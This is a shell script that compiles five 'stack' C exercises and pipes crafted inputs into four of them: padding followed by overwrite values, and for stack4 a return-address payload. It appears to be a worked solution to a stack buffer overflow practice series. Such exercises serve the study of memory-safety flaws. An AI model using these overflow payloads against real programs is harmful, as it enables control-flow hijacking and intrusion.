#Genererate .s files
echo -ne '*******************\n'
echo -ne 'Generating .s files\n'
echo -ne '*******************\n'
gcc -Wall -O0 -S -mrnames stack1.c -o stack1.s
gcc -Wall -O0 -S -mrnames stack2.c -o stack2.s
gcc -Wall -O0 -S -mrnames stack3.c -o stack3.s
gcc -Wall -O0 -S -mrnames stack4.c -o stack4.s
gcc -Wall -O0 -S -mrnames stack5.c -o stack5.s
echo -ne '****************************\n'
echo -ne 'Finished generating .s files\n'
echo -ne '****************************\n'

#Generate executables
echo -ne '****************************\n'
echo -ne 'Generating executable files\n'
echo -ne '****************************\n'
gcc -Wall -O0 stack1.c -o stack1.out
gcc -Wall -O0 stack2.c -o stack2.out
gcc -Wall -O0 stack3.c -o stack3.out
gcc -Wall -O0 stack4.c -o stack4.out
gcc -Wall -O0 stack5.c -o stack5.out
echo -ne '*************************************\n'
echo -ne 'Finished generating executable files\n'
echo -ne '*************************************\n'

#Runs

#Stack 1
echo -ne '********\n'
echo -ne 'Stack 1\n'
echo -ne '********\n'
echo 00000000000000000000000000000000000000000000000000000000000000000000000000000000DCBA| ./stack1.out

#Stack 2
echo -ne '********\n'
echo -ne 'Stack 2\n'
echo -ne '********\n'
echo -ne '00000000000000000000000000000000000000000000000000000000000000000000000000000000\x05\x03\x02\x01' | ./stack2.out

#Stack 3
echo -ne '********\n'
echo -ne 'Stack 3\n'
echo -ne '********\n'
echo -ne '00000000000000000000000000000000000000000000000000000000000000000000000000000000\x05\x00\x02\x01' | ./stack3.out

#Stack 4
echo -ne '********\n'
echo -ne 'Stack 4\n'
echo -ne '********\n'
perl -e 'print "a"x96 . "\x40\x0c\x40\x00"' | ./stack4.out


